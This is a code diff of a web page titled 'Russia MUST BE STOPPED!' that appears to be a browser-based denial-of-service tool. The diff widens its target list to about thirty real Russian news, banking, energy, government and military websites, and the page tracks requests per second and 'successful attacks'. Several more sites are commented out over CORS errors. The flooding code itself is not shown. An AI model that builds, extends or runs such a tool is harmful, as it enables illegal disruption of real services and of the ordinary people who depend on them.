@@ -1,13 +1,17 @@
+<!DOCTYPE html>
 <html>
 
 <head>
-    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Russia MUST BE STOPPED!</title>
     <style>
         body,
         body * {
             padding: 0;
             box-sizing: border-box;
+            word-wrap: break-word;
         }
 
         main {
@@ -57,8 +61,33 @@
 
         .table>.row>.cell {
             float: left;
-            width: 33%;
             padding: 2px 10px;
+        }
+
+        .table>.row>.cell:nth-child(1) {
+            width: 100%;
+        }
+
+        .table>.row>.cell:nth-child(2) {
+            width: 50%;
+        }
+
+        .table>.row>.cell:nth-child(3) {
+            width: 50%;
+        }
+
+        @media (min-width: 700px) {
+            .table>.row>.cell:nth-child(1) {
+                width: 70%;
+            }
+
+            .table>.row>.cell:nth-child(2) {
+                width: 15%;
+            }
+
+            .table>.row>.cell:nth-child(3) {
+                width: 15%;
+            }
         }
 
         @media (min-width: 1100px) {
@@ -96,14 +125,64 @@
             </div>
         </div>
         <h3>Here is the stats of your session:</h3>
-        <div class="stat">Sent <span id="requests_per_sec">0</span> request per second and got <span id="errors_per_sec">0</span> seccessful attacks!</div>
-        <div class="stat">Average <span id="requests_average">0</span> request and got <span id="errors_average">0</span> seccessful attacks per second!</div>
-        <div class="stat">Sent <span id="total_requests">0</span> request and got <span id="total_errors">0</span> seccessful attacks!</div>
+        <div class="stat">Latest <span id="requests_per_sec">0</span> request per second and <span id="errors_per_sec">0</span> was successful!</div>
+        <div class="stat">Average <span id="requests_average">0</span> requests and <span id="errors_average">0</span> was successful per second!</div>
+        <div class="stat">Total <span id="total_requests">0</span> request and <span id="total_errors">0</span> was successful!</div>
         <div id="table" class="table"></div>
         <p>If you missed it, <a href="https://www.bbc.com/news/world-europe-60503037">BBC NEWS: Ukraine conflict: Russian forces attack from three sides</a></p>
     </main>
 
     <script>
+        var targetLinks = [
+            'https://tass.ru/',
+            'https://lenta.ru/',
+            'https://tvzvezda.ru/',
+            'https://sberbank.ru/',
+            'https://www.1tv.ru/',
+            'https://www.rbc.ru/',
+            'https://www.rt.com/',
+            'https://vsoloviev.ru/',
+            'https://online.sberbank.ru/',
+            'https://ria.ru/lenta/',
+            'https://ria.ru/',
+            'http://kremlin.ru/',
+            'http://en.kremlin.ru/',
+
+            'https://www.gazprom.ru/',
+            'https://magnit.ru/',
+            'https://www.tatneft.ru/',
+            'https://nlmk.com/',
+            'https://www.sibur.ru/',
+            'https://www.severstal.com/',
+            'https://www.metalloinvest.com/',
+            'https://nangs.org/',
+            'https://omk.ru/',
+            'https://www.vtb.ru/',
+            'https://www.gazprombank.ru/',
+            'https://www.mos.ru/uslugi/',
+            'http://government.ru/',
+            'https://mil.ru/',
+            'https://www.nalog.gov.ru/',
+            'https://customs.gov.ru/',
+            'https://pfr.gov.ru/',
+            'https://rkn.gov.ru/',
+            'https://www.uralkali.com/ru/',
+
+            // CORS errors
+            // 'https://www.evraz.com/ru/',
+            // 'https://www.tmk-group.ru/',
+            // 'https://smotrim.ru/',
+            // 'https://www.vesti.ru/',
+            // 'https://www.surgutneftegas.ru/',
+            // 'https://www.polymetalinternational.com/ru/',
+            // 'https://lukoil.ru',
+            // 'https://www.nornickel.com/',
+            // 'https://rmk-group.ru/ru/',
+            // 'https://ya.ru/',
+            // 'https://www.eurosib.ru/',
+            // 'https://www.gosuslugi.ru/',
+        ];
+
         var seconds = 0;
         var requestPerSecond = 0;
         var errorsPerSecond = 0;
@@ -111,24 +190,6 @@
         var totalErrorsCount = 0;
         var maxRequestPerSecond = 0;
         var maxErrorsPerSecond = 0;
-        var targets = [
-            { link: 'https://tass.ru/', requests: 0, erroredResponses: 0 },
-            { link: 'https://lenta.ru/', requests: 0, erroredResponses: 0 },
-            { link: 'https://tvzvezda.ru/', requests: 0, erroredResponses: 0 },
-            { link: 'https://sberbank.ru/', requests: 0, erroredResponses: 0 },
-            { link: 'https://www.1tv.ru/', requests: 0, erroredResponses: 0 },
-            { link: 'https://www.rbc.ru/', requests: 0, erroredResponses: 0 },
-            { link: 'https://www.rt.com/', requests: 0, erroredResponses: 0 },
-            { link: 'https://vsoloviev.ru/', requests: 0, erroredResponses: 0 },
-            { link: 'https://online.sberbank.ru/', requests: 0, erroredResponses: 0 },
-            { link: 'https://ria.ru/lenta/', requests: 0, erroredResponses: 0 },
-            { link: 'https://www.vesti.ru/', requests: 0, erroredResponses: 0 },
-            { link: 'https://ria.ru/', requests: 0, erroredResponses: 0 },
-            { link: 'http://kremlin.ru/', requests: 0, erroredResponses: 0 },
-            { link: 'http://en.kremlin.ru/', requests: 0, erroredResponses: 0 },
-            { link: 'https://smotrim.ru/', requests: 0, erroredResponses: 0 },
-        ];
-
         var tableEl = document.getElementById('table');
         var reqPerSecEl = document.getElementById('requests_per_sec');
         var errPerSecEl = document.getElementById('errors_per_sec');
@@ -139,14 +200,24 @@
         var totalEl = document.getElementById('total');
         var speedEl = document.getElementById('speed');
 
+        var targets = [];
+
+        for (var i = 0; i < targetLinks.length; ++i) {
+            targets.push({
+                link: targetLinks[i],
+                requests: 0,
+                erroredResponses: 0
+            })
+        }
+
         function table(data) {
             var HTML = '';
             var size = data.length;
             for (var i = 0; i < size; ++i) {
                 HTML += '<div class="row">\
                             <div class="cell">' + data[i].link + '</div>\
-                            <div class="cell">' + data[i].requests + '</div>\
-                            <div class="cell">' + data[i].erroredResponses + '</div>\
+                            <div class="cell">' + data[i].requests.toLocaleString('es-US') + '</div>\
+                            <div class="cell">' + data[i].erroredResponses.toLocaleString('es-US') + '</div>\
                         </div>';
             }
             tableEl.innerHTML = HTML;
@@ -166,10 +237,10 @@
             table(sorted);
             reqPerSecEl.innerText = requestPerSecond;
             errPerSecEl.innerText = errorsPerSecond;
-            reqAverageEl.innerText = (totalRequestCount / seconds).toFixed(2);
-            errAverageEl.innerText = (totalErrorsCount / seconds).toFixed(2);
-            totalReqEl.innerText = totalRequestCount;
-            totalErrEl.innerText = totalErrorsCount;
+            reqAverageEl.innerText = Math.round(totalRequestCount / seconds).toLocaleString('es-US');
+            errAverageEl.innerText = (+(totalErrorsCount / seconds).toFixed(2)).toLocaleString('es-US');
+            totalReqEl.innerText = totalRequestCount.toLocaleString('es-US');
+            totalErrEl.innerText = totalErrorsCount.toLocaleString('es-US');
             requestPerSecond = 0;
             errorsPerSecond = 0;
         }
